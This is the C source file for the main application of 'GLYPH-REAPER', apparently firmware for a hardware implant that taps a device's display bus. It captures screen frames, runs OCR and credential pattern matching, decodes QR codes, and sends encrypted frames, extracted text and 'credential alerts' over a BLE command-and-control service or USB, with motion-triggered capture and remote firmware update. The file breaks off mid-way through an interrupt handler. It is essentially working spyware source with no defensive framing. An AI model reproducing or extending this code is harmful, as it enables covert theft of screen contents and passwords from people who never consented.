/**
 * @file main.c
 * @brief GLYPH-REAPER main application — embedded display bus interception firmware
 *
 * Full system initialization, peripheral setup, main event loop,
 * and error handling for the GLYPH-REAPER device.
 *
 * MCU: nRF52840-QIAA-R7 (Cortex-M4F @ 64 MHz)
 * SoftDevice: S140 v7.3.0 (BLE 5.2)
 * SDK: nRF5 SDK 17.1.0
 *
 * Architecture:
 *   - iCE40UP5K FPGA for display bus protocol capture (MIPI DSI/RGB/SPI/LVDS)
 *   - ESP32-S3 DSP for delta compression, OCR, and pattern matching
 *   - APS6404L 8MB QSPI PSRAM for frame buffers
 *   - W25Q128JV 16MB QSPI NOR Flash for bitstreams, OCR model, frame history
 *   - BLE 5.2 custom GATT service for encrypted frame exfiltration
 *   - USB CDC-ACM for wired control and data transfer
 *   - LIS2DH12 accelerometer for motion-triggered capture
 *   - 1 MHz TIMER0 for µs-precision frame timestamps
 *
 * Author: jayis1
 * @copyright Copyright (c) 2026 jayis1. All rights reserved.
 * @license GPL-2.0
 */

#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include "board.h"
#include "registers.h"
#include "drivers/fpga_driver.h"
#include "drivers/dsp_driver.h"
#include "drivers/psram_driver.h"
#include "drivers/flash_driver.h"
#include "drivers/frame_buffer.h"
#include "drivers/ble_c2_driver.h"
#include "drivers/usb_cdc_driver.h"
#include "drivers/accel_driver.h"
#include "drivers/crypto_driver.h"
#include "drivers/protocol_handler.h"
#include "drivers/compression_engine.h"

/*===========================================================================
 * GLOBAL STATE
 *===========================================================================*/

typedef enum {
    STATE_INIT,
    STATE_IDLE,
    STATE_CAPTURING,
    STATE_PROCESSING,
    STATE_EXFILTRATING,
    STATE_SLEEP,
    STATE_ERROR,
    STATE_FIRMWARE_UPDATE
} system_state_t;

static system_state_t g_system_state = STATE_INIT;
static volatile uint32_t g_uptime_seconds = 0;
static volatile bool g_ble_connected = false;
static volatile bool g_usb_connected = false;
static volatile uint32_t g_frame_count = 0;
static volatile uint32_t g_frames_dropped = 0;
static volatile uint32_t g_compression_ratio = 0;
static volatile uint32_t g_bytes_exfiltrated = 0;
static volatile bool g_motion_detected = false;
static volatile bool g_frame_ready = false;
static volatile bool g_ocr_ready = false;
static volatile bool g_alert_ready = false;

/* Device configuration (loaded from flash) */
static device_config_t g_config;

/* Active capture settings */
static display_protocol_t g_active_protocol = DISPLAY_PROTO_NONE;
static uint16_t g_frame_width = 0;
static uint16_t g_frame_height = 0;
static uint8_t g_color_depth = 16;
static uint8_t g_capture_fps = DEFAULT_CAPTURE_FPS;
static trigger_mode_t g_trigger_mode = TRIGGER_CONTINUOUS;

/* Frame buffers in PSRAM */
static uint8_t *g_frame_current = NULL;    /* Current captured frame */
static uint8_t *g_frame_previous = NULL;   /* Previous frame for delta */
static uint8_t *g_delta_buffer = NULL;     /* Compressed delta output */
static uint8_t *g_ocr_text_buffer = NULL;  /* OCR text results */
static uint8_t *g_frame_queue_buffer = NULL; /* Frame queue for streaming */

/* Ring buffer for frame queue */
static ring_buffer_t g_frame_queue;

/* Protocol handler state */
static protocol_state_t g_protocol_state;

/* Crypto state */
static uint8_t g_aes_key[BLE_AES_KEY_SIZE];
static uint8_t g_aes_iv[BLE_AES_IV_SIZE];
static uint32_t g_frame_key_counter = 0;

/* Error log (retained across soft resets) */
__attribute__((section(".noinit"))) static error_log_t g_error_log;

/* Frame metadata for current frame */
static frame_metadata_t g_current_frame_meta;

/* Capture statistics */
typedef struct {
    uint32_t total_frames;
    uint32_t dropped_frames;
    uint32_t keyframes;
    uint32_t delta_frames;
    uint32_t ocr_texts_extracted;
    uint32_t credential_alerts;
    uint32_t avg_compression_ratio;
    uint32_t avg_capture_time_us;
    uint32_t avg_process_time_us;
    uint32_t avg_exfil_time_us;
} capture_stats_t;

static capture_stats_t g_capture_stats;

/*===========================================================================
 * FORWARD DECLARATIONS
 *===========================================================================*/

static void system_init(void);
static void peripherals_init(void);
static void load_configuration(void);
static void save_configuration(void);
static void enter_capture_mode(void);
static void exit_capture_mode(void);
static void capture_frame(void);
static void process_frame(void);
static void exfiltrate_frame(void);
static void handle_motion_event(void);
static void handle_button_press(void);
static void update_status_led(void);
static void log_error(uint32_t code, uint32_t context);
static void handle_firmware_update(void);
static void power_management_loop(void);
static void crypto_rotate_keys(void);

/*===========================================================================
 * MAIN ENTRY POINT
 *===========================================================================*/

int main(void)
{
    /* Initialize the system */
    system_init();

    /* Load configuration from flash */
    load_configuration();

    /* Initialize all peripherals */
    peripherals_init();

    /* Initialize protocol handler */
    protocol_handler_init(&g_protocol_state);

    /* Initialize compression engine */
    compression_engine_init();

    /* Start BLE advertising */
    ble_c2_start_advertising();

    /* Transition to idle state */
    g_system_state = STATE_IDLE;
    LED_GRN_ON();

    /* Main event loop */
    while (1) {
        switch (g_system_state) {
        case STATE_IDLE:
            /* Wait for commands or motion trigger */
            if (g_trigger_mode == TRIGGER_ON_MOTION && g_motion_detected) {
                g_motion_detected = false;
                enter_capture_mode();
            }
            /* Check for start capture command */
            if (protocol_handler_has_pending_command(&g_protocol_state)) {
                protocol_handler_process_command(&g_protocol_state);
            }
            /* Low power wait for event */
            __WFE();
            break;

        case STATE_CAPTURING:
            /* Capture a frame from the display bus */
            capture_frame();

            /* Process the captured frame */
            g_system_state = STATE_PROCESSING;
            break;

        case STATE_PROCESSING:
            /* Compress, OCR, and pattern match */
            process_frame();

            /* Exfiltrate if connected */
            if (g_ble_connected || g_usb_connected) {
                g_system_state = STATE_EXFILTRATING;
            } else {
                /* Store for later retrieval */
                g_system_state = STATE_CAPTURING;
            }
            break;

        case STATE_EXFILTRATING:
            /* Send compressed frame + OCR text + alerts */
            exfiltrate_frame();

            /* Check if we should continue capturing */
            if (g_trigger_mode == TRIGGER_CONTINUOUS) {
                g_system_state = STATE_CAPTURING;
            } else if (g_trigger_mode == TRIGGER_ON_CHANGE) {
                /* Only capture next frame if content changed */
                if (g_current_frame_meta.flags & FRAME_FLAG_PARTIAL) {
                    g_system_state = STATE_CAPTURING;
                } else {
                    g_system_state = STATE_IDLE;
                }
            } else if (g_trigger_mode == TRIGGER_ON_MOTION) {
                g_system_state = STATE_IDLE;
            } else if (g_trigger_mode == TRIGGER_SCHEDULED) {
                g_system_state = STATE_IDLE;
            }
            break;

        case STATE_SLEEP:
            /* Deep sleep — wake on BLE event, button, or motion */
            LED_GRN_OFF();
            LED_RED_OFF();
            board_system_off();
            /* Returns here after wake */
            g_system_state = STATE_IDLE;
            LED_GRN_ON();
            break;

        case STATE_ERROR:
            /* Error state — blink red LED and attempt recovery */
            LED_RED_TGL();
            for (volatile int i = 0; i < 1000000; i++);
            /* Attempt to recover */
            if (g_error_log.entry_count > 0 && 
                g_error_log.entries[g_error_log.entry_count - 1].error_code == ERR_FPGA_CONFIG_FAILED) {
                fpga_reconfigure(g_active_protocol);
            }
            g_system_state = STATE_IDLE;
            break;

        case STATE_FIRMWARE_UPDATE:
            handle_firmware_update();
            break;

        default:
            g_system_state = STATE_IDLE;
            break;
        }

        /* Periodic tasks */
        if (g_uptime_seconds % 5 == 0) {
            /* Update status every 5 seconds */
            update_status_led();
        }

        /* Process protocol commands in all states */
        if (protocol_handler_has_pending_command(&g_protocol_state)) {
            protocol_handler_process_command(&g_protocol_state);
        }

        /* Watchdog kick */
        NRF_WDT->RR[0] = WDT_RR_VALUE;
    }

    return 0;
}

/*===========================================================================
 * SYSTEM INITIALIZATION
 *===========================================================================*/

static void system_init(void)
{
    /* Initialize GPIO */
    board_gpio_init();

    /* Initialize clocks */
    board_clock_init();

    /* Initialize power management */
    board_power_init();

    /* Enable FPU if present */
    *(volatile uint32_t *)NRF_FPU_BASE = 0x00000001UL;

    /* Clear pending interrupts */
    NVIC_ICPR0 = 0xFFFFFFFFUL;
    NVIC_ICPR1 = 0xFFFFFFFFUL;

    /* Initialize error log */
    if (g_error_log.magic != ERROR_LOG_MAGIC) {
        memset(&g_error_log, 0, sizeof(g_error_log));
        g_error_log.magic = ERROR_LOG_MAGIC;
    }

    /* Clear capture stats */
    memset(&g_capture_stats, 0, sizeof(g_capture_stats));
}

/*===========================================================================
 * PERIPHERAL INITIALIZATION
 *===========================================================================*/

static void peripherals_init(void)
{
    /* Initialize PSRAM (frame buffer storage) */
    if (!psram_init()) {
        log_error(ERR_PSRAM_ACCESS_FAILED, 0x01);
        g_system_state = STATE_ERROR;
        return;
    }

    /* Allocate frame buffers in PSRAM */
    g_frame_current = (uint8_t *)(PSRAM_BASE_ADDR + PSRAM_FRAME_CURRENT);
    g_frame_previous = (uint8_t *)(PSRAM_BASE_ADDR + PSRAM_FRAME_PREVIOUS);
    g_delta_buffer = (uint8_t *)(PSRAM_BASE_ADDR + PSRAM_DELTA_BUFFER);
    g_ocr_text_buffer = (uint8_t *)(PSRAM_BASE_ADDR + PSRAM_OCR_TEXT_BUFFER);
    g_frame_queue_buffer = (uint8_t *)(PSRAM_BASE_ADDR + PSRAM_FRAME_QUEUE);

    /* Initialize frame queue ring buffer */
    g_frame_queue = (ring_buffer_t)RING_BUFFER_INIT(
        g_frame_queue_buffer,
        PSRAM_FRAME_QUEUE_SIZE / sizeof(frame_metadata_t),
        sizeof(frame_metadata_t)
    );

    /* Initialize external flash */
    if (!flash_init()) {
        log_error(ERR_FLASH_ACCESS_FAILED, 0x01);
        /* Non-fatal — can operate without flash for frame history */
    }

    /* Initialize FPGA */
    fpga_driver_init();

    /* Configure FPGA with default protocol */
    if (!fpga_configure_bitstream(g_config.protocol)) {
        log_error(ERR_FPGA_CONFIG_FAILED, g_config.protocol);
        g_system_state = STATE_ERROR;
        return;
    }

    /* Initialize DSP co-processor */
    dsp_driver_init();

    /* Reset DSP */
    DSP_RESET_ASSERT();
    for (volatile int i = 0; i < 10000; i++);
    DSP_RESET_RELEASE();

    /* Wait for DSP boot */
    if (!dsp_wait_ready(1000)) {
        log_error(ERR_DSP_INIT_FAILED, 0x01);
        g_system_state = STATE_ERROR;
        return;
    }

    /* Load OCR model into DSP */
    if (g_config.ocr_enabled) {
        dsp_load_ocr_model();
    }

    /* Load pattern definitions into DSP */
    if (g_config.pattern_enabled) {
        dsp_load_patterns();
    }

    /* Set DSP processing mode */
    uint8_t dsp_mode = DSP_MODE_FULL_PIPELINE;
    if (g_config.power_mode == DSP_POWER_LOW) {
        dsp_mode = DSP_MODE_COMPRESS_ONLY;
    }
    dsp_set_mode(dsp_mode);

    /* Initialize accelerometer */
    accel_driver_init();

    /* Configure accelerometer for motion detection */
    if (g_trigger_mode == TRIGGER_ON_MOTION) {
        accel_enable_motion_interrupt(2);  /* 2g threshold */
    }

    /* Initialize BLE */
    ble_c2_init(g_config.device_name, strlen((char *)g_config.device_name));

    /* Initialize USB CDC */
    usb_cdc_init();

    /* Initialize crypto */
    crypto_driver_init();
    memcpy(g_aes_key, g_config.aes_key, BLE_AES_KEY_SIZE);
    crypto_generate_iv(g_aes_iv);

    /* Initialize timestamp timer (TIMER0 @ 1 MHz) */
    NRF_TIMER0->MODE = TIMER_MODE_TIMER;
    NRF_TIMER0->BITMODE = TIMER_BITMODE_32BIT;
    NRF_TIMER0->PRESCALER = TIMER_PRESCALER_DIV16;  /* 16MHz/16 = 1MHz */
    NRF_TIMER0->TASKS_CLEAR = 1;
    NRF_TIMER0->TASKS_START = 1;

    /* Initialize system RTC for uptime tracking */
    NRF_RTC2->PRESCALER = RTC_PRESCALER_DIV32;  /* 1024 Hz ~ 1ms */
    NRF_RTC2->INTENSET = RTC_INT_TICK;
    NRF_RTC2->TASKS_START = 1;

    /* Initialize watchdog */
    NRF_WDT->CRV = 32768 * WDT_TIMEOUT_SEC;  /* 8 seconds at 32.768 kHz */
    NRF_WDT->RREN = WDT_RREN_RR0;
    NRF_WDT->CONFIG = WDT_CONFIG_HALT_RUN | WDT_CONFIG_SLEEP_RUN;
    NRF_WDT->TASKS_START = 1;
}

/*===========================================================================
 * CONFIGURATION MANAGEMENT
 *===========================================================================*/

static void load_configuration(void)
{
    /* Read configuration from flash */
    device_config_t *flash_config = 
        (device_config_t *)(NOR_FLASH_BASE_ADDR + NOR_FLASH_CONFIG);

    if (flash_config->magic == CONFIG_MAGIC && 
        flash_config->version == CONFIG_VERSION) {
        /* Validate CRC */
        uint32_t crc = flash_calculate_crc32(flash_config, 
            sizeof(device_config_t) - sizeof(uint32_t));
        if (crc == flash_config->crc) {
            memcpy(&g_config, flash_config, sizeof(g_config));
        } else {
            /* CRC mismatch — use defaults */
            memset(&g_config, 0, sizeof(g_config));
            g_config.magic = CONFIG_MAGIC;
            g_config.version = CONFIG_VERSION;
            g_config.protocol = DISPLAY_PROTO_RGB_PARALLEL;
            g_config.default_width = 480;
            g_config.default_height = 320;
            g_config.default_color_depth = COLOR_DEPTH_RGB565;
            g_config.default_fps = DEFAULT_CAPTURE_FPS;
            g_config.trigger_mode = TRIGGER_CONTINUOUS;
            g_config.ocr_enabled = 1;
            g_config.pattern_enabled = 1;
            g_config.qr_decode_enabled = 1;
            g_config.encryption_enabled = 1;
            g_config.delta_threshold = 10;
            g_config.power_mode = DSP_POWER_NORMAL;
            strcpy((char *)g_config.device_name, BLE_DEVICE_NAME);
            crypto_generate_key(g_config.aes_key);
        }
    } else {
        /* No valid config — use defaults */
        memset(&g_config, 0, sizeof(g_config));
        g_config.magic = CONFIG_MAGIC;
        g_config.version = CONFIG_VERSION;
        g_config.protocol = DISPLAY_PROTO_RGB_PARALLEL;
        g_config.default_width = 480;
        g_config.default_height = 320;
        g_config.default_color_depth = COLOR_DEPTH_RGB565;
        g_config.default_fps = DEFAULT_CAPTURE_FPS;
        g_config.trigger_mode = TRIGGER_CONTINUOUS;
        g_config.ocr_enabled = 1;
        g_config.pattern_enabled = 1;
        g_config.qr_decode_enabled = 1;
        g_config.encryption_enabled = 1;
        g_config.delta_threshold = 10;
        g_config.power_mode = DSP_POWER_NORMAL;
        strcpy((char *)g_config.device_name, BLE_DEVICE_NAME);
        crypto_generate_key(g_config.aes_key);
    }

    /* Apply configuration */
    g_active_protocol = g_config.protocol;
    g_frame_width = g_config.default_width;
    g_frame_height = g_config.default_height;
    g_color_depth = g_config.default_color_depth;
    g_capture_fps = g_config.default_fps;
    g_trigger_mode = g_config.trigger_mode;
}

static void save_configuration(void)
{
    /* Update CRC */
    g_config.crc = flash_calculate_crc32(&g_config, 
        sizeof(device_config_t) - sizeof(uint32_t));

    /* Erase config sector and write */
    flash_erase_sector(NOR_FLASH_CONFIG);
    flash_write(NOR_FLASH_CONFIG, (uint8_t *)&g_config, sizeof(g_config));
}

/*===========================================================================
 * CAPTURE OPERATIONS
 *===========================================================================*/

static void enter_capture_mode(void)
{
    /* Configure FPGA for active protocol */
    if (!fpga_configure_bitstream(g_active_protocol)) {
        log_error(ERR_FPGA_CONFIG_FAILED, g_active_protocol);
        g_system_state = STATE_ERROR;
        return;
    }

    /* Set resolution in FPGA */
    fpga_set_resolution(g_frame_width, g_frame_height, g_color_depth);

    /* Enable capture in FPGA */
    fpga_enable_capture(true);

    /* Clear frame count */
    g_frame_count = 0;

    /* Start DSP processing pipeline */
    dsp_set_resolution(g_frame_width, g_frame_height);
    dsp_set_color_depth(g_color_depth);
    dsp_start_processing();

    /* Transition to capturing state */
    g_system_state = STATE_CAPTURING;
    LED_GRN_OFF();
    LED_BLU_ON();

    /* Send status update */
    protocol_handler_send_status(&g_protocol_state, 
        MSG_STATUS_UPDATE, g_system_state);
}

static void exit_capture_mode(void)
{
    /* Stop FPGA capture */
    fpga_enable_capture(false);

    /* Stop DSP processing */
    dsp_stop_processing();

    /* Transition to idle */
    g_system_state = STATE_IDLE;
    LED_BLU_OFF();
    LED_GRN_ON();

    /* Send status update */
    protocol_handler_send_status(&g_protocol_state, 
        MSG_STATUS_UPDATE, g_system_state);
}

static void capture_frame(void)
{
    uint32_t timestamp = NRF_TIMER0->CC[0];  /* Current timer value */
    uint32_t capture_start = timestamp;

    /* Wait for FPGA to signal frame ready (VSYNC) */
    uint32_t timeout = 100000;  /* 100ms timeout at 1 MHz */
    while (!fpga_is_frame_ready()) {
        if (--timeout == 0) {
            log_error(ERR_BUFFER_OVERFLOW, 0x01);
            g_frames_dropped++;
            g_capture_stats.dropped_frames++;
            return;
        }
    }

    /* Read frame data from FPGA into PSRAM current frame buffer */
    uint32_t frame_size = fpga_read_frame(g_frame_current, 
        g_frame_width, g_frame_height, g_color_depth);

    if (frame_size == 0) {
        log_error(ERR_BUFFER_OVERFLOW, 0x02);
        g_frames_dropped++;
        g_capture_stats.dropped_frames++;
        return;
    }

    /* Update frame metadata */
    memset(&g_current_frame_meta, 0, sizeof(g_current_frame_meta));
    g_current_frame_meta.frame_index = g_frame_count;
    g_current_frame_meta.timestamp_us = timestamp;
    g_current_frame_meta.width = g_frame_width;
    g_current_frame_meta.height = g_frame_height;
    g_current_frame_meta.color_depth = g_color_depth;
    g_current_frame_meta.compression_type = 0;  /* Raw for now */
    g_current_frame_meta.compressed_size = frame_size;

    /* Update stats */
    uint32_t capture_time = NRF_TIMER0->CC[0] - capture_start;
    g_capture_stats.avg_capture_time_us = 
        (g_capture_stats.avg_capture_time_us * g_capture_stats.total_frames + 
         capture_time) / (g_capture_stats.total_frames + 1);
    g_capture_stats.total_frames++;

    g_frame_count++;
    g_frame_ready = true;
}

/*===========================================================================
 * FRAME PROCESSING (Compression + OCR + Pattern Matching)
 *===========================================================================*/

static void process_frame(void)
{
    uint32_t process_start = NRF_TIMER0->CC[0];

    /* Send current frame to DSP for processing */
    dsp_write_frame(g_frame_current, 
        g_frame_width * g_frame_height * (g_color_depth / 8));

    /* Send previous frame for delta computation */
    dsp_write_reference_frame(g_frame_previous,
        g_frame_width * g_frame_height * (g_color_depth / 8));

    /* Start compression */
    dsp_start_compression(g_config.delta_threshold);

    /* Start OCR if enabled */
    if (g_config.ocr_enabled) {
        dsp_start_ocr();
    }

    /* Start pattern matching if enabled */
    if (g_config.pattern_enabled) {
        dsp_start_pattern_matching();
    }

    /* Start QR decoding if enabled */
    if (g_config.qr_decode_enabled) {
        dsp_start_qr_decode();
    }

    /* Wait for DSP to complete (with timeout) */
    uint32_t timeout = 500000;  /* 500ms */
    while (!dsp_is_processing_complete()) {
        if (--timeout == 0) {
            log_error(ERR_DSP_INIT_FAILED, 0x02);
            break;
        }
    }

    /* Read compressed frame data from DSP */
    uint32_t compressed_size = dsp_read_compressed(g_delta_buffer, 
        PSRAM_DELTA_BUFFER_SIZE);

    if (compressed_size > 0) {
        g_current_frame_meta.compression_type = 2;  /* Delta + RLE */
        g_current_frame_meta.compressed_size = compressed_size;

        /* Calculate compression ratio */
        uint32_t raw_size = g_frame_width * g_frame_height * (g_color_depth / 8);
        if (raw_size > 0) {
            g_compression_ratio = (100 * (raw_size - compressed_size)) / raw_size;
            g_capture_stats.avg_compression_ratio = 
                (g_capture_stats.avg_compression_ratio * 
                 (g_capture_stats.total_frames - 1) + g_compression_ratio) /
                g_capture_stats.total_frames;
        }

        /* Determine if this is a keyframe or delta */
        if (compressed_size < raw_size * (1 - MAX_DELTA_RATIO)) {
            g_current_frame_meta.flags |= FRAME_FLAG_PARTIAL;
            g_capture_stats.delta_frames++;
        } else {
            g_current_frame_meta.flags |= FRAME_FLAG_KEYFRAME;
            g_capture_stats.keyframes++;
        }
    }

    /* Read OCR text if enabled */
    if (g_config.ocr_enabled) {
        uint16_t ocr_len = dsp_read_ocr_text(g_ocr_text_buffer, 
            PSRAM_OCR_TEXT_SIZE);
        if (ocr_len > 0) {
            g_current_frame_meta.flags |= FRAME_FLAG_OCR_AVAILABLE;
            g_current_frame_meta.ocr_text_length = ocr_len;
            g_capture_stats.ocr_texts_extracted++;
            g_ocr_ready = true;
        }
    }

    /* Read credential alerts if pattern matching enabled */
    if (g_config.pattern_enabled) {
        uint16_t alert_count = dsp_read_alerts();
        if (alert_count > 0) {
            g_current_frame_meta.flags |= FRAME_FLAG_ALERTS_PRESENT;
            g_current_frame_meta.alert_count = alert_count;
            g_capture_stats.credential_alerts += alert_count;
            g_alert_ready = true;
        }
    }

    /* Swap frame buffers: current becomes previous */
    uint8_t *temp = g_frame_previous;
    g_frame_previous = g_frame_current;
    g_frame_current = temp;

    /* Update stats */
    uint32_t process_time = NRF_TIMER0->CC[0] - process_start;
    g_capture_stats.avg_process_time_us = 
        (g_capture_stats.avg_process_time_us * 
         (g_capture_stats.total_frames - 1) + process_time) /
        g_capture_stats.total_frames;
}

/*===========================================================================
 * FRAME EXFILTRATION (BLE / USB)
 *===========================================================================*/

static void exfiltrate_frame(void)
{
    uint32_t exfil_start = NRF_TIMER0->CC[0];
    uint32_t bytes_sent = 0;

    /* Encrypt the compressed frame data */
    uint8_t encrypted_buffer[512];  /* Chunk buffer */
    uint32_t remaining = g_current_frame_meta.compressed_size;
    uint32_t offset = 0;

    /* Rotate keys if needed */
    if (g_frame_key_counter >= BLE_FRAME_KEY_ROTATION) {
        crypto_rotate_keys();
        g_frame_key_counter = 0;
    }

    /* Send frame header (metadata) */
    if (g_ble_connected) {
        bytes_sent += ble_c2_send_frame_header(&g_current_frame_meta);
    } else if (g_usb_connected) {
        bytes_sent += usb_cdc_send_frame_header(&g_current_frame_meta);
    }

    /* Send frame data in encrypted chunks */
    while (remaining > 0) {
        uint32_t chunk_size = MIN(remaining, sizeof(encrypted_buffer) - 
            BLE_AES_GCM_TAG_SIZE - BLE_AES_IV_SIZE);

        /* Encrypt chunk */
        uint32_t encrypted_size = crypto_encrypt(
            g_delta_buffer + offset,
            chunk_size,
            encrypted_buffer,
            g_aes_key,
            g_aes_iv
        );

        if (encrypted_size == 0) {
            log_error(ERR_ENCRYPTION_FAILED, offset);
            break;
        }

        /* Send encrypted chunk */
        if (g_ble_connected) {
            bytes_sent += ble_c2_send_data(encrypted_buffer, encrypted_size);
        } else if (g_usb_connected) {
            bytes_sent += usb_cdc_send_data(encrypted_buffer, encrypted_size);
        }

        offset += chunk_size;
        remaining -= chunk_size;
    }

    /* Send OCR text if available */
    if (g_ocr_ready && g_current_frame_meta.ocr_text_length > 0) {
        uint8_t ocr_encrypted[PSRAM_OCR_TEXT_SIZE + BLE_AES_GCM_TAG_SIZE + BLE_AES_IV_SIZE];
        uint32_t enc_size = crypto_encrypt(
            g_ocr_text_buffer,
            g_current_frame_meta.ocr_text_length,
            ocr_encrypted,
            g_aes_key,
            g_aes_iv
        );

        if (enc_size > 0) {
            if (g_ble_connected) {
                bytes_sent += ble_c2_send_ocr_text(ocr_encrypted, enc_size, 
                    g_current_frame_meta.frame_index);
            } else if (g_usb_connected) {
                bytes_sent += usb_cdc_send_ocr_text(ocr_encrypted, enc_size,
                    g_current_frame_meta.frame_index);
            }
        }
        g_ocr_ready = false;
    }

    /* Send credential alerts if available */
    if (g_alert_ready && g_current_frame_meta.alert_count > 0) {
        uint8_t alerts[256];
        uint16_t alert_data_size = dsp_read_alert_data(alerts, sizeof(alerts));

        uint8_t alert_encrypted[256 + BLE_AES_GCM_TAG_SIZE + BLE_AES_IV_SIZE];
        uint32_t enc_size = crypto_encrypt(
            alerts,
            alert_data_size,
            alert_encrypted,
            g_aes_key,
            g_aes_iv
        );

        if (enc_size > 0) {
            if (g_ble_connected) {
                bytes_sent += ble_c2_send_credential_alert(alert_encrypted, 
                    enc_size, g_current_frame_meta.frame_index);
            } else if (g_usb_connected) {
                bytes_sent += usb_cdc_send_credential_alert(alert_encrypted,
                    enc_size, g_current_frame_meta.frame_index);
            }
        }
        g_alert_ready = false;
    }

    /* Store frame metadata in history (flash) */
    if (g_frame_count % 10 == 0) {
        /* Store every 10th frame's metadata */
        uint32_t history_offset = NOR_FLASH_FRAME_HISTORY + 
            (g_frame_count / 10) * sizeof(frame_metadata_t);
        if (history_offset + sizeof(frame_metadata_t) < 
            NOR_FLASH_FRAME_HISTORY + NOR_FLASH_FRAME_HISTORY_SIZE) {
            flash_write(history_offset, (uint8_t *)&g_current_frame_meta,
                sizeof(frame_metadata_t));
        }
    }

    /* Update stats */
    g_bytes_exfiltrated += bytes_sent;
    g_frame_key_counter++;
    uint32_t exfil_time = NRF_TIMER0->CC[0] - exfil_start;
    g_capture_stats.avg_exfil_time_us = 
        (g_capture_stats.avg_exfil_time_us * 
         (g_capture_stats.total_frames - 1) + exfil_time) /
        g_capture_stats.total_frames;
}

/*===========================================================================
 * CRYPTO KEY MANAGEMENT
 *===========================================================================*/

static void crypto_rotate_keys(void)
{
    /* Derive new key from current key using ECB */
    uint8_t new_key[BLE_AES_KEY_SIZE];
    crypto_derive_key(g_aes_key, new_key);
    memcpy(g_aes_key, new_key, BLE_AES_KEY_SIZE);
    crypto_generate_iv(g_aes_iv);
}

/*===========================================================================
 * EVENT HANDLERS
 *===========================================================================*/

static void handle_motion_event(void)
{
    g_motion_detected = true;

    /* If in sleep, wake up */
    if (g_system_state == STATE_SLEEP) {
        g_system_state = STATE_IDLE;
    }
}

static void handle_button_press(void)
{
    static uint32_t last_press = 0;
    uint32_t now = g_uptime_seconds;

    /* Debounce */
    if (now - last_press < BTN_DEBOUNCE_MS / 1000) {
        return;
    }
    last_press = now;

    /* Short press: toggle capture */
    if (g_system_state == STATE_IDLE) {
        enter_capture_mode();
    } else if (g_system_state == STATE_CAPTURING || 
               g_system_state == STATE_PROCESSING ||
               g_system_state == STATE_EXFILTRATING) {
        exit_capture_mode();
    }
}

/*===========================================================================
 * UTILITY FUNCTIONS
 *===========================================================================*/

static void update_status_led(void)
{
    /* Green: idle, Blue: capturing, Red: error */
    if (g_system_state == STATE_ERROR) {
        LED_RED_ON();
        LED_GRN_OFF();
        LED_BLU_OFF();
    } else if (g_system_state == STATE_CAPTURING ||
               g_system_state == STATE_PROCESSING ||
               g_system_state == STATE_EXFILTRATING) {
        LED_RED_OFF();
        LED_GRN_OFF();
        LED_BLU_ON();
    } else if (g_system_state == STATE_IDLE) {
        LED_RED_OFF();
        LED_GRN_ON();
        LED_BLU_OFF();
    }
}

static void log_error(uint32_t code, uint32_t context)
{
    if (g_error_log.entry_count < ERROR_LOG_MAX_ENTRIES) {
        g_error_log.entries[g_error_log.entry_count].error_code = code;
        g_error_log.entries[g_error_log.entry_count].timestamp = g_uptime_seconds;
        g_error_log.entries[g_error_log.entry_count].context = context;
        g_error_log.entry_count++;
    } else {
        /* Shift log entries */
        memmove(&g_error_log.entries[0], &g_error_log.entries[1],
            (ERROR_LOG_MAX_ENTRIES - 1) * sizeof(error_entry_t));
        g_error_log.entries[ERROR_LOG_MAX_ENTRIES - 1].error_code = code;
        g_error_log.entries[ERROR_LOG_MAX_ENTRIES - 1].timestamp = g_uptime_seconds;
        g_error_log.entries[ERROR_LOG_MAX_ENTRIES - 1].context = context;
    }
}

static void handle_firmware_update(void)
{
    /* Receive firmware image via BLE or USB */
    uint32_t image_size = 0;
    uint32_t image_crc = 0;
    uint8_t *image_buffer = g_frame_current;  /* Reuse frame buffer */

    /* Wait for firmware image transfer */
    if (g_ble_connected) {
        image_size = ble_c2_receive_firmware(image_buffer, 
            PSRAM_FRAME_CURRENT_SIZE, &image_crc);
    } else if (g_usb_connected) {
        image_size = usb_cdc_receive_firmware(image_buffer,
            PSRAM_FRAME_CURRENT_SIZE, &image_crc);
    }

    if (image_size == 0) {
        log_error(ERR_FIRMWARE_CRC, 0x01);
        g_system_state = STATE_ERROR;
        return;
    }

    /* Verify CRC */
    uint32_t calculated_crc = flash_calculate_crc32(image_buffer, image_size);
    if (calculated_crc != image_crc) {
        log_error(ERR_FIRMWARE_CRC, calculated_crc);
        g_system_state = STATE_ERROR;
        return;
    }

    /* Write firmware to flash DFU area */
    flash_erase_range(NOR_FLASH_DFU_IMAGE, image_size);
    flash_write(NOR_FLASH_DFU_IMAGE, image_buffer, image_size);

    /* Trigger DFU (softdevice handles the actual swap) */
    ble_c2_trigger_dfu();

    /* Device will reset — should not reach here */
    while (1);
}

static void power_management_loop(void)
{
    uint16_t bat_mv = board_battery_read_mv();
    power_source_t pwr = board_get_power_source();

    /* Low battery handling */
    if (pwr == POWER_SOURCE_COINCELL && bat_mv < VBAT_LOW_MV) {
        /* Reduce capture rate to save power */
        if (g_capture_fps > 5) {
            g_capture_fps = 5;
        }

        /* Disable OCR to save power */
        if (g_config.ocr_enabled) {
            dsp_set_mode(DSP_MODE_COMPRESS_ONLY);
        }
    }

    /* Critical battery */
    if (pwr == POWER_SOURCE_COINCELL && bat_mv < VBAT_CRITICAL_MV) {
        /* Switch to harvested power if available */
        if (GPIO_IN_READ(1, BOARD_PIN_PWR_HARVEST_EN) == 0) {
            board_select_power_source(POWER_SOURCE_HARVESTED);
        } else {
            /* Enter deep sleep */
            g_system_state = STATE_SLEEP;
        }
    }

    /* Temperature monitoring */
    int8_t temp = board_temperature_read();
    if (temp > 70) {
        log_error(ERR_OVERHEATING, temp);
        /* Reduce processing to lower temperature */
        dsp_set_power_mode(DSP_POWER_LOW);
    }
}

/*===========================================================================
 * INTERRUPT HANDLERS
 *===========================================================================*/

/* GPIOTE interrupt handler */
void GPIOTE_IRQHandler(void)
{
    /* Check VSYNC interrupt (frame ready from FPGA) */
    if (GPIOTE_EVENTS_IN1) {
        GPIOTE_EVENTS_IN1 = 0;
        g_frame_ready = true;
    }

    /* Check HSYNC interrupt (line ready) */
    if (GPIOTE_EVENTS_IN2) {
        GPIOTE_EVENTS_IN2 = 0;
        /* Could be used for line-by-line processing */
    }

    /* Check DSP handshake */
    if (GPIOTE_EVENTS_IN3) {
        GPIOTE_EVENTS_IN3 = 0;
        /* DSP has data ready */
    }

    /* Check user button */
    if (GPIOTE_EVENTS_IN4) {
        GPIOTE_EVENTS_IN4 = 0;
        handle_button_press();
    }

    /* Check SD card detect */
    if (GPIOTE_EVENTS_IN5) {
        GPIOTE_EVENTS_IN5 = 0;
